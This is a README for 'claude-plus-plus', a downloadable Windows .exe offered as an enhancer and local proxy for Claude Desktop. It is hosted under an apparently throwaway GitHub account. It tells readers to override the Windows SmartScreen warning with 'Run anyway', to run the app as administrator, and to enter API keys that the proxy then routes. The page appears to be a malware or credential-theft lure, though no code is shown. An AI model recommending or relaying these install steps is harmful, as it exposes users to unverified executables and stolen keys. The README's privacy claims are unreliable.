# 🛠️ claude-plus-plus - Improve your Claude Desktop experience today

[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/exciting-soursop787/claude-plus-plus)

## 📦 What is this tool?

Claude++ acts as a helper for your Claude Desktop application. It adds features that the standard version lacks. You can use it to change the language of the interface, connect to different service providers, and improve how the app handles your messages. It runs on your computer as a local bridge to manage your connection settings.

## 🚀 System Requirements

Before you start, ensure your computer meets these needs:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Claude Desktop**: You must install the official Claude Desktop app first.
*   **Memory**: At least 4GB of RAM.
*   **Storage**: 200MB of free disk space.
*   **Network**: A stable internet connection.

## 📥 How to download and install

Follow these steps to set up the tool on your machine:

1. Visit the project website: [https://github.com/exciting-soursop787/claude-plus-plus](https://github.com/exciting-soursop787/claude-plus-plus).
2. Look for the "Releases" section on the right side of the page.
3. Click on the latest version number link.
4. Scroll down to the "Assets" area.
5. Click the file ending in `.exe` to trigger the download.
6. Once the download finishes, open the file.
7. Windows might show a blue window saying "Windows protected your PC." If this appears, click "More info" and then select "Run anyway."
8. Follow the on-screen prompts to complete the installation.

## ⚙️ Setting up the application

After you install the software, you need to configure it to match your preferences:

1. Launch Claude++ from your desktop icon.
2. The application will detect your current setup.
3. Choose your preferred language from the settings menu.
4. Select your API provider if you intend to use custom service routes. You will need an API key from your chosen provider.
5. Save your settings. The app will restart to apply the changes.

## ✨ Key features

The tool provides several enhancements for your daily workflow:

*   **Interface Translation**: Switch the application language to your local language with one click.
*   **Service Routing**: Route your requests through different model providers to manage costs or performance.
*   **Conversation Tools**: Use enhanced buttons to copy, clear, or save your chat history.
*   **Local Proxy**: The app creates a secure link on your machine to manage traffic between your computer and the AI service.

## 🔧 Frequently asked questions

**Do I need to pay for this?**
The tool is free to use. You only pay for the service provider you choose to connect through the app.

**Is my data private?**
Yes. The software runs locally on your computer. It does not send your data to outside servers except for the official AI provider you choose to connect.

**What should I do if the app crashes?**
Close the app and open it again. Check that you have the most recent version from the download page.

**Will this interfere with my official Claude Desktop?**
This tool works alongside the official application to improve its function. It does not replace the official app.

## 📈 Troubleshooting tips

If you encounter issues during setup, try these local fixes:

*   **App won't start**: Right-click the app icon and select "Run as administrator."
*   **API errors**: Verify that your API key is correct and has not expired.
*   **Settings not saving**: Ensure you have write permissions for the folder where the app is installed.
*   **Slow performance**: Close other heavy programs to free up system resources.
